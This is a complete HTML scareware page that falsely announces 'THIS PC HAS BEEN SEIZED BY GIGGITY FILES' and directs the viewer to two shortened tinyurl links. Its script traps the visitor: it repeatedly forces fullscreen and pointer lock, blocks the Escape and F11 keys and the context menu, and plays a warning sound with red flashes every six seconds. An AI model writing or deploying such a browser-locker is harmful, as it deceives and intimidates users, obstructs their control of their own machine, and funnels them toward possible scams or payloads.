<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>System Notice</title>
<style>
  @keyframes pulse {
    0% { background-color: black; }
    50% { background-color: #2a0000; }
    100% { background-color: black; }
  }
  @keyframes flicker {
    0%,19%,21%,23%,25%,54%,56%,100% { opacity: 1; }
    20%,22%,24%,55% { opacity: 0.3; }
  }
  @keyframes shake {
    0% { transform: translate(0, 0); }
    20% { transform: translate(-5px, 0); }
    40% { transform: translate(5px, 0); }
    60% { transform: translate(-5px, 0); }
    80% { transform: translate(5px, 0); }
    100% { transform: translate(0, 0); }
  }
  html, body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: "Arial Narrow", Arial, sans-serif;
    user-select: none;
    cursor: none;
    animation: pulse 2s infinite;
    color: red;
    text-align: center;
    transition: background 0.1s;
  }
  h1 {
    font-size: 3em;
    margin: 0.5em 0;
    text-shadow: 0 0 20px red;
    animation: flicker 0.15s infinite, shake 0.2s infinite;
  }
  p { 
    font-size: 1.5em; 
    margin: 0.5em 0; 
    animation: flicker 0.3s infinite; 
  }
  .urls {
    font-size: 1.3em;
    color: yellow;
    user-select: text;
    animation: flicker 0.4s infinite;
  }
</style>
</head>
<body>
<div>
  <h1>THIS PC HAS BEEN SEIZED BY GIGGITY FILES</h1>
  <p>Visit the following addresses exactly as written:</p>
  <p class="urls">
    tinyurl.com/ggtfiles<br>
    tinyurl.com/quagfile
  </p>
</div>

<audio id="warningAudio" src="warning.wav" preload="auto"></audio>

<script>
(function() {
  const root = document.documentElement;
  const body = document.body;
  const warningAudio = document.getElementById("warningAudio");

  function playWarning() {
    warningAudio.currentTime = 0;
    warningAudio.play().catch(()=>{});
  }

  function requestFS() {
    const req = root.requestFullscreen || root.webkitRequestFullscreen || root.msRequestFullscreen;
    if (req) req.call(root).catch(()=>{});
  }

  function lockPointer() {
    const lock = root.requestPointerLock || root.mozRequestPointerLock;
    if (lock) lock.call(root);
  }

  function enforceFullscreen() {
    if (!document.fullscreenElement &&
        !document.webkitFullscreenElement &&
        !document.msFullscreenElement) {
      requestFS();
      lockPointer();
    }
  }

  function flashScreen() {
    body.style.background = 'red';
    playWarning();
    setTimeout(() => body.style.background = '', 500);
  }

  requestFS();
  lockPointer();
  playWarning();

  setInterval(() => enforceFullscreen(), 200);
  setInterval(flashScreen, 6000);

  ["click","keydown","pointerdown","touchstart","mousemove"].forEach(evt => {
    window.addEventListener(evt, () => { enforceFullscreen(); lockPointer(); }, {passive:true});
  });

  window.addEventListener("keydown", e => {
    if (["Escape","F11"].includes(e.key)) {
      e.preventDefault();
      enforceFullscreen();
      lockPointer();
    }
  }, true);

  window.addEventListener("contextmenu", e => e.preventDefault());
})();
</script>
</body>
</html>
